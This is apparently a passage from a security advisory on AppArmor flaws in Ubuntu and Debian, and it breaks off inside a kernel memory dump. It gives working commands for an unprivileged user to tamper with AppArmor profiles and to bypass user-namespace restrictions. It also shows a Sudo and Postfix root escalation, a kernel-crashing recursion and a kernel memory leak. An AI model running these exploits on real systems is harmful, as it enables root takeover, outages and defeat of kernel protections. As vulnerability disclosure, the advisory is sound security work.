+Removing an existing profile
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+To remove an existing AppArmor profile (for example, the profile for
+rsyslogd) as an unprivileged local user, we simply write() the name of
+this profile to AppArmor's .remove file, via su's stdout in pty mode
+(note: su's password prompt below is obviously for our unprivileged
+user, not for root):
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ ls -l /sys/kernel/security/apparmor/policy/profiles/*rsyslogd*
+total 0
+-r--r--r-- 1 root root 0 Oct 14 12:17 attach
+-r--r--r-- 1 root root 0 Oct 14 12:17 learning_count
+-r--r--r-- 1 root root 0 Oct 14 12:17 mode
+-r--r--r-- 1 root root 0 Oct 14 12:17 name
+lr--r--r-- 1 root root 0 Oct 14 12:17 raw_abi -> ../../raw_data/93/abi
+lr--r--r-- 1 root root 0 Oct 14 12:17 raw_data -> ../../raw_data/93/raw_data
+lr--r--r-- 1 root root 0 Oct 14 12:17 raw_sha256 -> ../../raw_data/93/sha256
+-r--r--r-- 1 root root 0 Oct 14 12:17 sha256
+
+$ su -P -c 'stty raw && echo -n rsyslogd' "$USER" > /sys/kernel/security/ap=
+parmor/.remove
+Password:=20
+
+$ ls -l /sys/kernel/security/apparmor/policy/profiles/*rsyslogd*
+ls: cannot access '/sys/kernel/security/apparmor/policy/profiles/*rsyslogd*=
+': No such file or directory
+------------------------------------------------------------------------
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Loading a new profile
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+To load a new AppArmor profile (for example, a "deny all" profile for
+sshd) as an unprivileged local user, we first compile this profile into
+a binary form with apparmor_parser, and then write() this binary profile
+to AppArmor's .load file, via su's stdout in pty mode (note: we load an
+empty profile below, instead of an explicit "deny all" profile, because
+AppArmor profiles are already allow-lists by default):
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ ls -l /sys/kernel/security/apparmor/policy/profiles/*sshd*
+ls: cannot access '/sys/kernel/security/apparmor/policy/profiles/*sshd*': N=
+o such file or directory
+
+$ apparmor_parser -K -o sshd.pf << "EOF"
+/usr/sbin/sshd {
+}
+EOF
+
+$ su -P -c 'stty raw && cat sshd.pf' "$USER" > /sys/kernel/security/apparmo=
+r/.load
+Password:=20
+
+$ ls -l /sys/kernel/security/apparmor/policy/profiles/*sshd*
+total 0
+-r--r--r-- 1 root root 0 Oct 14 17:01 attach
+-r--r--r-- 1 root root 0 Oct 14 17:01 learning_count
+-r--r--r-- 1 root root 0 Oct 14 17:01 mode
+-r--r--r-- 1 root root 0 Oct 14 17:01 name
+lr--r--r-- 1 root root 0 Oct 14 17:01 raw_abi -> ../../raw_data/105/abi
+lr--r--r-- 1 root root 0 Oct 14 17:01 raw_data -> ../../raw_data/105/raw_da=
+ta
+lr--r--r-- 1 root root 0 Oct 14 17:01 raw_sha256 -> ../../raw_data/105/sha2=
+56
+-r--r--r-- 1 root root 0 Oct 14 17:01 sha256
+
+$ ssh localhost
+kex_exchange_identification: read: Connection reset by peer
+Connection reset by 127.0.0.1 port 22
+------------------------------------------------------------------------
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Bypassing Ubuntu's user-namespace restrictions
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+To bypass Ubuntu's unprivileged user-namespace restrictions, we load a
+new "userns" AppArmor profile for /usr/bin/time, which then allows us to
+create unprivileged user namespaces with full capabilities, even if all
+publicly known bypasses (aa-exec, busybox, and LD_PRELOAD) were fixed:
+
+  https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-na=
+mespace-restrictions.txt
+  https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-rest=
+riction/58007
+
+  https://u1f383.github.io/linux/2025/06/26/the-journey-of-bypassing-ubuntu=
+s-unprivileged-namespace-restriction.html
+  (by Pumpkin Chang)
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ sysctl kernel.apparmor_restrict_unprivileged_unconfined
+kernel.apparmor_restrict_unprivileged_unconfined =3D 1
+
+$ unshare -U -r -m /bin/sh
+unshare: write failed /proc/self/uid_map: Operation not permitted
+
+$ aa-exec -p trinity -- unshare -U -r -m /bin/sh
+unshare: write failed /proc/self/uid_map: Operation not permitted
+
+$ apparmor_parser -K -o time.pf << "EOF"
+/usr/bin/time flags=3D(unconfined) {
+  userns,
+}
+EOF
+
+$ su -P -c 'stty raw && cat time.pf' "$USER" > /sys/kernel/security/apparmo=
+r/.replace
+Password:=20
+
+$ /usr/bin/time -- unshare -U -r -m /bin/sh
+# mount --bind /etc/passwd /etc/passwd
+# mount
+...
+/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/passwd type ext4 (rw,relatime)
+------------------------------------------------------------------------
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+AppArmor + Sudo + Postfix =3D root
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    Did you get your disconnection notice?
+    Mine came in the mail today
+        -- Sonic Youth, "Disconnection Notice"
+
+As an unprivileged local attacker, the ability to load, replace, and
+remove arbitrary AppArmor profiles is remarkable, but our crucial and
+burning question was: can this ability be transformed into an LPE to
+full root privileges? Our key idea was to load new AppArmor profiles
+that deny certain syscalls to certain privileged programs, and
+consequently to create exploitable "fail-open" situations.
+
+=46rom our work on Baron Samedit, we remembered that when Sudo encounters
+an unusual situation, it sends a mail to the system's administrator. And
+to send such a mail on Ubuntu, Sudo executes /usr/sbin/sendmail as our
+unprivileged user, not as root, with our original environment variables
+preserved (excluding the obviously dangerous variables such as LD_AUDIT
+and LD_PRELOAD, which were removed from the environment by the dynamic
+loader, ld.so, before the execution of Sudo's main() function).
+
+=46rom CVE-2002-0043:
+
+  https://www.sudo.ws/security/advisories/postfix/
+  (by Sebastian Krahmer)
+
+we also remembered that if the Postfix mail server is installed on the
+system, and if Postfix's /usr/sbin/sendmail is executed as root but with
+user-controlled environment variables (in particular, the MAIL_CONFIG
+environment variable), then Postfix can be forced by the unprivileged
+user into executing arbitrary commands as root.
+
+Our burning question therefore became: if we, as an unprivileged local
+attacker, load a new AppArmor profile that denies the setuid capability
+(CAP_SETUID) to Sudo (thereby potentially preventing Sudo from dropping
+its root privileges before it executes Postfix's /usr/sbin/sendmail),
+and if we execute Sudo with a MAIL_CONFIG environment variable that
+points to our own Postfix configuration in /tmp, is the /usr/bin/id
+command from our Postfix configuration executed as root? The answer:
+
+------------------------------------------------------------------------
+$ grep PRETTY_NAME=3D /etc/os-release
+PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
+
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ dpkg -S /usr/sbin/sendmail
+postfix: /usr/sbin/sendmail
+
+$ mkdir /tmp/postfix
+
+$ cat > /tmp/postfix/main.cf << "EOF"
+command_directory =3D /tmp/postfix
+EOF
+
+$ cat > /tmp/postfix/postdrop << "EOF"
+#!/bin/sh
+/usr/bin/id >> /tmp/postfix/pwned
+EOF
+
+$ chmod -R 0755 /tmp/postfix
+
+$ apparmor_parser -K -o sudo.pf << "EOF"
+/usr/bin/sudo {
+  allow file,
+  allow signal,
+  allow network,
+  allow capability,
+  deny capability setuid,
+}
+EOF
+
+$ su -P -c 'stty raw && cat sudo.pf' "$USER" > /sys/kernel/security/apparmo=
+r/.replace
+Password:=20
+
+$ env -i MAIL_CONFIG=3D/tmp/postfix /usr/bin/sudo whatever
+sudo: PERM_SUDOERS: setresuid(-1, 1, -1): Operation not permitted
+sudo: unable to open /etc/sudoers: Operation not permitted
+sudo: setresuid() [0, 0, 0] -> [1001, -1, -1]: Operation not permitted
+sudo: error initializing audit plugin sudoers_audit
+
+$ cat /tmp/postfix/pwned
+uid=3D0(root) gid=3D1001(jane) groups=3D1001(jane),100(users)
+^^^^^^^^^^^
+------------------------------------------------------------------------
+
+The surprising sequence of events that led to this LPE as root is:
+
+- in sudoers_init(), Sudo calls setresuid(0, -1, -1) to set its real uid
+  to 0 (PERM_ROOT), which succeeds because its effective and saved uids
+  are already 0 (Sudo is SUID-root);
+
+- in open_sudoers() (more precisely, in open_file()), Sudo calls
+  setresuid(-1, 1, -1) to temporarily set its effective uid to 1
+  (PERM_SUDOERS), which fails (with EPERM, "Operation not permitted")
+  because none of Sudo's uids is 1 (they are all 0) and because Sudo
+  does not have the CAP_SETUID (our AppArmor profile denies it);
+
+- back in sudoers_init(), Sudo calls mail_parse_errors() to send a mail
+  to the administrator about this setresuid() failure ("problem parsing
+  sudoers", "unable to open /etc/sudoers: Operation not permitted");
+
+- then, in exec_mailer(), Sudo calls setuid(0) (at line 331 below) to
+  set all of its uids to 0, which succeeds because they are already 0;
+
+- still in exec_mailer(), Sudo calls setuid(1001) (at line 336) to
+  permanently set all of its uids to our unprivileged user's uid, which
+  fails (with EPERM, "Operation not permitted") because none of Sudo's
+  uids is 1001 (they are all 0) and because Sudo does not have the
+  CAP_SETUID (our AppArmor profile denies it);
+
+- finally, and despite this setuid() failure, Sudo's exec_mailer() calls
+  execv() (at line 345) to execute Postfix's /usr/sbin/sendmail with our
+  original environment variables (including our MAIL_CONFIG), as root
+  instead of our unprivileged user (because the setuid(1001) to drop
+  Sudo's root privileges failed).
+
+------------------------------------------------------------------------
+ 284 exec_mailer(int pipein)
+ ...
+ 327     /*
+ 328      * Depending on the config, either run the mailer as root
+ 329      * (so user cannot kill it) or as the user (for the paranoid).
+ 330      */
+ 331     if (setuid(ROOT_UID) !=3D 0) {
+ 332         sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid to %=
+u",
+ 333             ROOT_UID);
+ 334     }
+ 335     if (evl_conf->mailuid !=3D ROOT_UID) {
+ 336         if (setuid(evl_conf->mailuid) !=3D 0) {
+ 337             sudo_debug_printf(SUDO_DEBUG_ERROR, "unable to change uid =
+to %u",
+ 338                 (unsigned int)evl_conf->mailuid);
+ 339         }
+ 340     }
+ ...
+ 342     if (evl_conf->mailuid =3D=3D ROOT_UID)
+ 343         execve(mpath, argv, (char **)root_envp);
+ 344     else
+ 345         execv(mpath, argv);
+------------------------------------------------------------------------
+
+Note: without the ability to load an AppArmor profile that denies the
+CAP_SETUID to Sudo, this "fail-open" situation in Sudo would not be
+exploitable, for the reasons explained in the "execve() and EAGAIN"
+section of "man execve".
+
+Last-minute note: while writing a mail to Sudo's maintainer about this
+"fail-open" situation, we noticed that it was independently discovered,
+reported, and fixed in November 2025 (commit 3e474c2):
+
+------------------------------------------------------------------------
+exec_mailer: Set group as well as uid when running the mailer
+Also make a setuid(), setgid() or setgroups() failure fatal.
+Found by the ZeroPath AI Security Engineer <https://zeropath.com>
+------------------------------------------------------------------------
+
+Slightly disappointed by this user-space LPE (because Postfix is not
+installed by default on Ubuntu anymore), we decided to explore one more
+idea: maybe AppArmor's kernel code contains vulnerabilities that can be
+exploited in kernel space by loading, replacing, or removing arbitrary
+AppArmor profiles?
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+An uncontrolled recursion
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    I think I've been there once before
+    Something tells me there's so much more
+        -- Sonic Youth, "The Wonder"
+
+The first kernel vulnerability that we discovered in AppArmor's code is
+an uncontrolled recursion. An AppArmor profile can contain subprofiles
+(named "myprofile//mysubprofile" for example), which can themselves
+contain subprofiles (named "myprofile//mysubprofile//mysubsubprofile"
+for example), etc. To remove such a profile, AppArmor's kernel code
+calls __remove_profile(), which first calls __aa_profile_list_release()
+to remove all of its subprofiles, which then calls __remove_profile()
+again, etc; in other words, __remove_profile() is called recursively:
+
+------------------------------------------------------------------------
+ 192 static void __remove_profile(struct aa_profile *profile)
+ ...
+ 198         /* release any children lists first */
+ 199         __aa_profile_list_release(&profile->base.profiles);
+------------------------------------------------------------------------
+ 212 void __aa_profile_list_release(struct list_head *head)
+ ...
+ 215         list_for_each_entry_safe(profile, tmp, head, base.list)
+ 216                 __remove_profile(profile);
+------------------------------------------------------------------------
+
+Consequently, if we create a deeply nested hierarchy of subprofiles
+(1024, in the proof-of-concept below), and if we remove the ancestor
+profile (by write()ing its name to AppArmor's .remove pseudo-file), then
+AppArmor calls __remove_profile() recursively, exhausts its kernel stack
+(16KB on x86_64), and crashes the system (because Ubuntu 24.04.3 and
+Debian 13.1 protect their kernel stacks with CONFIG_VMAP_STACK guard
+pages).
+
+To load all of these subprofiles in the proof-of-concept below, we first
+create an AppArmor namespace, by loading a new namespaced profile (named
+":mynamespace:myprofile" for example), and enter this AppArmor namespace
+through a new user namespace (created thanks to our "userns" profile for
+/usr/bin/time) to obtain full capabilities inside this AppArmor and user
+namespace. This allows us to write() to AppArmor's pseudo-files directly
+(.load, .replace, .remove) instead of write()ing to these files via su's
+stdout in pty mode, but it is not strictly necessary (we could execute
+su repeatedly, or execute it once and carefully synchronize repeated
+write()s); it does, however, greatly simplify our proof-of-concept:
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ ls -l /sys/kernel/security/apparmor/policy/namespaces
+total 0
+
+$ apparmor_parser -K -o myns.pf << "EOF"
+profile :myns:mypf flags=3D(unconfined) {
+  userns,
+}
+EOF
+
+$ su -P -c 'stty raw && cat myns.pf' "$USER" > /sys/kernel/security/apparmo=
+r/.load
+Password:=20
+
+$ ls -l /sys/kernel/security/apparmor/policy/namespaces
+total 0
+drwxr-xr-x 5 root root 0 Oct 15 16:04 myns
+
+$ /usr/bin/time -- aa-exec -n myns -p mypf -- unshare -U -r /bin/bash
+
+# pf=3D'a'; for ((i=3D0; i<1024; i++)); do
+    echo -e "profile $pf { \n }" | apparmor_parser -K -a;
+    pf=3D"$pf//x";
+done
+
+# echo -n a > /sys/kernel/security/apparmor/.remove
+Write failed: Broken pipe
+------------------------------------------------------------------------
+
+To the best of our knowledge, this uncontrolled recursion is only a
+denial-of-service (not an LPE), because no kernel stack allocation is
+large enough to jump over the CONFIG_VMAP_STACK guard page (step 3 in
+the "stack-clash" attack).
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+An out-of-bounds read
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    Close your eyes and feel the fun
+    Pattern recognition is on the run
+        -- Sonic Youth, "Pattern Recognition"
+
+The second kernel vulnerability that we discovered in AppArmor's code is
+an out-of-bounds memory read. When a user-space program that is confined
+by an AppArmor profile tries to access a file or directory (/etc/passwd
+or /etc for example), AppArmor decides whether this access should be
+allowed or denied by matching the filename against an AppArmor Regular
+Expression (AARE), which is similar to a shell globbing pattern (for
+example, /etc/*).
+
+In the kernel, AppArmor implements such an AARE with a Deterministic
+Finite Automaton (DFA) -- essentially a state machine: a set of states,
+and transitions between these states that depend on the input string to
+be matched. To match a string (a filename) against such a DFA, AppArmor
+calls aa_dfa_match(), which calls match_char() in a loop, for each byte
+of the input string. Unfortunately, match_char() is an unsafe macro (it
+can evaluate its arguments more than once, because of its "} while (1)"
+loop and its MATCH_FLAG_DIFF_ENCODE at lines 371-372), and its call at
+line 457 has side effects (the increment of the str pointer):
+
+------------------------------------------------------------------------
+365 #define match_char(state, def, base, next, check, C)    \
+366 do {                                                    \
+367         u32 b =3D (base)[(state)];                        \
+368         unsigned int pos =3D base_idx(b) + (C);           \
+369         if ((check)[pos] !=3D (state)) {                  \
+370                 (state) =3D (def)[(state)];               \
+371                 if (b & MATCH_FLAG_DIFF_ENCODE)         \
+372                         continue;                       \
+373                 break;                                  \
+374         }                                               \
+375         (state) =3D (next)[pos];                          \
+376         break;                                          \
+377 } while (1)
+------------------------------------------------------------------------
+435 aa_state_t aa_dfa_match(struct aa_dfa *dfa, aa_state_t start, const cha=
+r *str)
+...
+456                 while (*str)
+457                         match_char(state, def, base, next, check, (u8) =
+*str++);
+------------------------------------------------------------------------
+
+As a result, the str pointer can be incremented more than once inside
+match_char(), past the string's terminating null byte (without passing
+through the null-byte test at line 456), thus leading to out-of-bounds
+memory reads, after the 8KB buffer where the string (the filename) is
+kmalloc()ed. Since we can build our own AppArmor DFA (by loading a new
+arbitrary profile), we had the idea of transforming this out-of-bounds
+read into a kernel-memory disclosure.
+
+For example, to disclose the 6th byte of the string "/etc" (the 1st byte
+is '/', the 5th byte is the terminating null byte '\0', and the 6th byte
+is the first out-of-bounds byte), we build a DFA that is equivalent to a
+"?????a*" globbing pattern (but our '?' matches any byte, including a
+null byte), we load it (by write()ing to AppArmor's .load file), we
+confine ourselves with it (by write()ing to /proc/self/attr/current),
+and we try to access /etc in the filesystem:
+
+- if this access is allowed (if our DFA accepts the string "/etc" and
+  the following bytes), then the first out-of-bounds byte is indeed 'a';
+
+- if this access is denied (if our DFA rejects the string "/etc" and the
+  following bytes), then the first out-of-bounds byte is not 'a', and we
+  retry with another DFA, "?????b*", then "?????c*", "?????d*", etc.
+
+In the worst case, this takes 256 tries to disclose one out-of-bounds
+byte; but we can do much better, we can build a DFA that accepts a whole
+range of bytes as the 6th byte, for example "?????[\x00-\x7F]*":
+
+- if the access is allowed, then the 6th byte is in the range
+  [\x00-\x7F], and we retry with half of it, "?????[\x00-\x3F]*", etc;
+
+- if the access is denied, then the 6th byte is in the range
+  [\x80-\xFF], and we retry with half of it, "?????[\x80-\xBF]*", etc.
+
+This binary search takes only 8 tries to disclose one out-of-bounds byte
+(one try per bit). More generally, to disclose the nth byte of the input
+string (the filename), we build a DFA that has n+2 states:
+
+- state i (1 <=3D i < n) reads the ith byte of the input string and always
+  transitions to state i+1, independently of the value of the ith byte
+  (this is the "?????" part of our "?????[\x00-\x7F]*" example);
+
+- state n transitions to state n+1 if the nth byte of the input string
+  is in the accepted range, or transitions to state n+2 otherwise (this
+  is the "[\x00-\x7F]" part of our "?????[\x00-\x7F]*" example);
+
+- state n+1 (the accept state) and state n+2 (the reject state) always
+  transition to themselves, until a null byte is read at line 456 (this
+  is the "*" part of our "?????[\x00-\x7F]*" example).
+
+Note: because AppArmor's DFA states are represented by 16-bit integers,
+we can only disclose 64KB of kernel memory.
+
+In the proof-of-concept below, we disclose the bytes from 60KB to 61KB
+after the 8KB buffer where the filename "/etc/passwd" is kmalloc()ed,
+including several kernel pointers randomized by KASLR (for example,
+ffffffffa7ea7420 is aa_global_buffers, ffffffffa6c43480 is shmem_ops,
+and ffffffffa86b19e0 is noop_backing_dev_info):
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ /usr/bin/time -- aa-exec -n myns -p mypf -- unshare -U -r /bin/bash
+
+# ./infoleak 1 64
+0000: 2f/ 65e 74t 63c 2f/ 70p 61a 73s 73s 77w 64d 00. 00. e0. 2c, 80. 1e. 8=
+e. ff. ff. 20. 74t ea. a7. ff. ff. ff. ff. 00. 00. 00. 00.=20
+0020: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0040.
+
+# ./infoleak $((60*1024)) $((61*1024))
+0000: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 98. 2d- 80. 1=
+e. 8e. ff. ff. 00. c8. 2d- 80. 1e. 8e. ff. ff. 1b. 00. 00.=20
+0020: 00. 0c. 00. 00. 00. 00. 10. 00. 00. 00. 00. 00. 00. ff. ff. ff. ff. f=
+f. ff. ff. 7f. e0. bd. e2. a7. ff. ff. ff. ff. 80. 344 c4.=20
+0040: a6. ff. ff. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 40@ 2b+ c4. a6. ff. ff. ff. ff. 00. 00. 81.=20
+0060: 70p 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 94. 19. 02. 01. 0=
+0. 00. 00. 00. 40@ 08. 49I 80. 1e. 8e. ff. ff. 00. 00. 00.=20
+0080: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 88. 90. 2d- 80. 1e. 8e. ff. ff. 88. 90. 2d-=20
+00a0: 80. 1e. 8e. ff. ff. 01. 00. 00. 00. 08. 00. 00. 00. 20. 22" 29) 80. 1=
+e. 8e. ff. ff. a0. 2b+ c4. a6. ff. ff. ff. ff. 00. 00. 00.=20
+00c0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+00e0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 80. 7e~ 2a* 80. 1=
+e. 8e. ff. ff. 80. 12. 72r 83. 1e. 8e. ff. ff. 00. 00. 00.=20
+0100: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. e0. 19. 6bk a8. f=
+f. ff. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. 10. c9. 2d-=20
+0120: 80. 1e. 8e. ff. ff. 10. 399 4bK 83. 1e. 8e. ff. ff. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0140: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 48H 91. 2d- 80. 1e. 8e. ff. ff. 48H 91. 2d-=20
+0160: 80. 1e. 8e. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0180: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+01a0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+01c0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+01e0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0200: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0220: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0240: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0260: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0280: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 80. 92. 2d- 80. 1=
+e. 8e. ff. ff. 80. 92. 2d- 80. 1e. 8e. ff. ff. 00. 00. 00.=20
+02a0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 28( 3c< 04. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+02c0: 00. 00. 00. 00. 00. b8. 92. 2d- 80. 1e. 8e. ff. ff. b8. 92. 2d- 80. 1=
+e. 8e. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+02e0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. e0. 92. 2d- 80. 1=
+e. 8e. ff. ff. e0. 92. 2d- 80. 1e. 8e. ff. ff. 00. 00. 00.=20
+0300: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 2c, 3c< 04. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0320: 00. 00. 00. 00. 00. 18. 93. 2d- 80. 1e. 8e. ff. ff. 18. 93. 2d- 80. 1=
+e. 8e. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0340: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 40@ 93. 2d- 80. 1=
+e. 8e. ff. ff. 40@ 93. 2d- 80. 1e. 8e. ff. ff. 00. 00. 00.=20
+0360: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 300 3c< 04. 00. 0=
+0. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+0380: 00. 00. 00. 00. 00. 78x 93. 2d- 80. 1e. 8e. ff. ff. 78x 93. 2d- 80. 1=
